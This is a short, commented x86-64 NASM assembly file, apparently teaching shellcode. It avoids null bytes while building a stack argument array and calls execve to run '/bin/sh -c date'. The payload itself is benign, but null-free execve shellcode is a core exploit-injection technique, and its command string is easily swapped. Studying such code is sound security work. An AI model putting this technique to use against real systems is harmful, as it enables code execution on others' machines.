;asmsyntax=nasm      ; uncomment this and reopen if you want color "editing"  in vim

BITS  64            ;telling assembler -> it is a 64 bit code
xor   rax,rax       ;zero out rax
cdq                 ;zero out rdx too
push  rax           ;null terminating for following array

mov   qword  rbx,'//bin/sh'  ;strncpy(rax,"//bin/sh",8);
shr   rbx,8                  ;shift right by 8 bits : null termination 
push  rbx                    ;push the string on stack
mov   rdi,rsp                ;MOVING ADDRESS OF /bin/sh to rdi
push  rax                    ;null termination for "-c"
xor   rbx,rbx                ;zero out rbx
mov   qword rbx,'//-c'       ;mov with sign extension the array "-c"
shr   rbx,16                ;THis way just avoid null bytes , you can discover your own way too 
push  rbx                    ;pushing array on the stack
mov   rbx,rsp                ;moving pointer to the array to rbx
push  rax                    ;null termination for "date"
xor   rcx,rcx                ;zero out rcx
mov   qword rcx,'date'       ;moving date to rcx
push  rcx                    ;pushing date to rcx
mov   rcx,rsp                ;moving address of rsp to rcx

;laying stack for 2nd arguments to execve wiz. ["/bin/sh",-c,date,NULL]
push  rax         ;NULL pointer for args
push  rcx         ;pushing pointer to "date"
push  rbx         ;pushing pointer to "-c"
push  rdi         ;pointer  to /bin/sh to stack

;remember  rdx and rdi already have desired values

mov   rsi,rsp     ;pointing to array of pointers
mov   al,0x3b     ;executing execve("/bin/sh",["/bin/sh",-c,date,NULL],0)
syscall                       
